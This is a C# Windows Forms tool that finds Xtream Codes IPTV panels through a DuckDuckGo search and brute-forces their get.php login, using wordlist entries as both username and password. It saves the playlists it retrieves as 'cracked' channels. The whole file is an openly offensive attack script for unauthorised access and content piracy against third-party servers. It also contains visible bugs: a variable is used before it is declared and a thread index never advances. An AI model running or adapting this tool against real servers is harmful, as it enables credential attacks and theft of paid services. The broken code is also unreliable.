using HtmlAgilityPack;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;
using System.IO;
using System.Net;
using System.Threading;

namespace IPTV_Sharp
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void crack(String server, String list)
        {
            int p = 0;
            string line;

            StreamReader file = new StreamReader(list);
            while ((line = file.ReadLine()) != null)
            {
                string url = server + "/get.php?username=" + line + "&password=" + line + "&type=m3u&output=mpegts";
                string output = "output/tv_channels_" + line + ".m3u";

                using (WebClient client = new WebClient())
                {
                    string page = client.DownloadString(url);
                    if(page != "")
                    {
                        using (StreamWriter outputFile = new StreamWriter(output, true))
                        {
                            outputFile.WriteLine(page);
                        }
                    }
                }
                p++;
            }

            file.Close();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

            string url = "https://duckduckgo.com/html/?q=Xtream+Codes+v1.0.59.5&kl=it-it";
            var servers = new List<string>();

            HtmlWeb crawler = new HtmlWeb();
            HtmlAgilityPack.HtmlDocument doc = crawler.Load(url);

            foreach (HtmlNode link in doc.DocumentNode.SelectNodes("//a[@href]"))
            {
                HtmlAttribute att = link.Attributes["href"];

                if (att.Value.Contains("http://"))
                {
                    string[] temp = att.Value.Split('/');
                    string tempx = temp[0] + "//" + temp[2];
                    if (!servers.Any(tempx.Contains) && temp[2].Contains(":"))
                    {
                        servers.Add(tempx);
                        comboBox1.Items.Add(tempx);
                    }
                }
            }     

            label3.Visible = false;
            label1.Visible = true;
            comboBox1.Visible = true;
            button1.Visible = true;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string[] lists = { "part_list/a.txt", "part_list/b.txt", "part_list/c.txt", "part_list/d.txt", "part_list/e.txt", "part_list/f.txt", "part_list/g.txt", "part_list/i.txt", "part_list/l.txt", "part_list/m.txt", "part_list/n.txt", "part_list/o.txt", "part_list/p.txt", "part_list/r.txt", "part_list/s.txt", "part_list/u.txt", "part_list/z.txt" };

            if (comboBox1.Text == "")
            {
                MessageBox.Show("You must select a target.", "No target", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            }
            else
            {
                using (WebClient client = new WebClient())
                {
                    try
                    {
                        string page = client.DownloadString(server);
                        if (page != "" && page.Contains("Xtream Codes"))
                        {
                            string server = comboBox1.Text;
                            label3.Text = "Attack in progress, check output directory for cracked channel";
                            label3.Visible = true;
                            label1.Enabled = false;
                            comboBox1.Enabled = false;
                            button1.Enabled = false;

                            int x = 0;
                            Thread[] threads = new Thread[17];

                            foreach (String list in lists)
                            {
                                threads[x] = new Thread(() => crack(server, list));
                                threads[x].Start();
                            }

                            foreach(Thread thread in threads)
                            {
                                thread.Join();
                            }

                            MessageBox.Show("Done!", "", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);

                            label3.Visible = false;
                            label1.Enabled = true;
                            comboBox1.Enabled = true;
                            button1.Enabled = true;
                        }
                        else
                        {
                            MessageBox.Show("Target is not a IPTV site.", "No IPTV site", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                        }
                    }
                    catch (WebException ex)
                    {
                        MessageBox.Show("Invalid URL!", "Error!", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
            }
        }
    }
}
